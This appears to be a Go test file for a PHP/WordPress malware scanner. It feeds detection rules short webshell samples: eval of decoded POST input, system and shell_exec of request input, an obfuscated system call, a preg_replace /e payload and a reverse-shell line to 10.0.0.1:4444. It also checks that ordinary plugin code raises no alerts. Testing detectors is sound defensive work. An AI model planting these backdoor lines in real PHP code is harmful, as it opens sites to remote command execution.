package security

import (
	"strings"
	"testing"
)

func findRule(t *testing.T, findings []Finding, ruleTitle string) bool {
	t.Helper()
	for _, f := range findings {
		if f.Title == ruleTitle {
			return true
		}
	}
	return false
}

// Every rule must fire on the specific pattern it targets. Table-driven so
// adding a rule without a corresponding positive sample is an obvious gap.
func TestHeuristicsDetectKnownMalwarePatterns(t *testing.T) {
	cases := []struct {
		name    string
		content string
		wantID  string
	}{
		{
			"eval base64_decode",
			`<?php eval(base64_decode($_POST['z'])); ?>`,
			"eval-decoded-input",
		},
		{
			"eval gzinflate",
			`<?php eval(gzinflate(str_rot13('...'))); ?>`,
			"eval-decoded-input",
		},
		{
			"eval of raw POST",
			`<?php eval($_POST['cmd']); ?>`,
			"eval-request-input",
		},
		{
			"assert of raw GET (classic PHP5-era backdoor)",
			`<?php assert($_GET['x']); ?>`,
			"eval-request-input",
		},
		{
			"system of raw request input",
			`<?php system($_REQUEST['c']); ?>`,
			"exec-request-input",
		},
		{
			"shell_exec of cookie input",
			`<?php shell_exec($_COOKIE['cmd']); ?>`,
			"exec-request-input",
		},
		{
			"preg_replace /e modifier RCE",
			`<?php preg_replace('/.*/e', $_GET['x'], 'y'); ?>`,
			"preg_replace_e_modifier",
		},
		{
			"obfuscated function name",
			`<?php $a = 'sy'.'st'.'em'; $a($_GET['c']); ?>`,
			"obfuscated-function-call",
		},
		{
			"reverse shell shape",
			`<?php $s=fsockopen("10.0.0.1",4444); system("/bin/sh -i <&3 >&3 2>&3"); ?>`,
			"reverse-shell-indicator",
		},
		{
			"known webshell marker",
			`<?php // WSO 4.2.6 Shell echo "c99shell rulez"; ?>`,
			"webshell-marker",
		},
		{
			"long base64 blob",
			`<?php $x = "` + strings.Repeat("QWxhZGRpbjpvcGVuIHNlc2FtZQ", 40) + `"; ?>`,
			"long-base64-blob",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			findings := ScanContent("test.php", []byte(c.content))
			found := false
			for _, f := range findings {
				for _, rule := range builtinRules {
					if rule.Title == f.Title && rule.ID == c.wantID {
						found = true
					}
				}
			}
			if !found {
				t.Errorf("rule %q did not fire on:\n%s", c.wantID, c.content)
			}
		})
	}
}

// This is the half that actually makes a scanner usable: ordinary WordPress
// core/plugin/theme code, and general legitimate PHP, must not trip any
// rule. Every sample below is a realistic simplification of real,
// unremarkable code.
func TestHeuristicsDoNotFlagLegitimateCode(t *testing.T) {
	samples := map[string]string{
		"typical plugin bootstrap": `<?php
/**
 * Plugin Name: Example
 */
if ( ! defined( 'ABSPATH' ) ) { exit; }
function example_init() {
	add_action( 'init', 'example_register_post_type' );
}
add_action( 'plugins_loaded', 'example_init' );
`,
		"form handling with sanitisation": `<?php
$name = sanitize_text_field( $_POST['name'] ?? '' );
$email = sanitize_email( $_POST['email'] ?? '' );
if ( ! is_email( $email ) ) {
	wp_die( 'Invalid email' );
}
update_post_meta( $post_id, 'contact_email', $email );
`,
		"a real base64 use — encoding an image, not hiding a payload": `<?php
$data = base64_encode( file_get_contents( $path ) );
echo '<img src="data:image/png;base64,' . esc_attr( $data ) . '">';
`,
		"REST API callback reading query params": `<?php
register_rest_route( 'myplugin/v1', '/items', array(
	'methods'  => 'GET',
	'callback' => function ( WP_REST_Request $request ) {
		$id = absint( $request->get_param( 'id' ) );
		return get_post( $id );
	},
) );
`,
		"shell_exec used legitimately by an admin tool with a fixed command": `<?php
// Not flagged: no request-controlled input reaches the shell call at all.
$output = shell_exec( 'git rev-parse HEAD' );
`,
		"ordinary string concatenation that is not function-name obfuscation": `<?php
$greeting = 'Hello, ' . $user->display_name . '!';
$class = 'button button-' . esc_attr( $type );
`,
		"database class with lots of function calls, no dangerous ones": `<?php
class Example_DB {
	public function get_rows( $table ) {
		global $wpdb;
		return $wpdb->get_results( $wpdb->prepare( "SELECT * FROM {$wpdb->prefix}$table WHERE id = %d", 1 ) );
	}
}
`,
	}
	for name, content := range samples {
		t.Run(name, func(t *testing.T) {
			findings := ScanContent("test.php", []byte(content))
			if len(findings) != 0 {
				t.Errorf("legitimate code triggered %d false positive(s): %v", len(findings), findings)
			}
		})
	}
}

func TestScanContentEmptyFile(t *testing.T) {
	if findings := ScanContent("empty.php", []byte("")); len(findings) != 0 {
		t.Errorf("empty file should produce no findings, got %v", findings)
	}
}

// Every finding must carry enough for an operator to act on it — a title
// with no detail or no suggested fix is not useful in an incident.
func TestFindingsAreActionable(t *testing.T) {
	findings := ScanContent("shell.php", []byte(`<?php eval($_POST['x']); ?>`))
	if len(findings) == 0 {
		t.Fatal("expected at least one finding")
	}
	for _, f := range findings {
		if f.Title == "" || f.Detail == "" || f.Fix == "" || f.Path == "" {
			t.Errorf("incomplete finding: %+v", f)
		}
	}
}
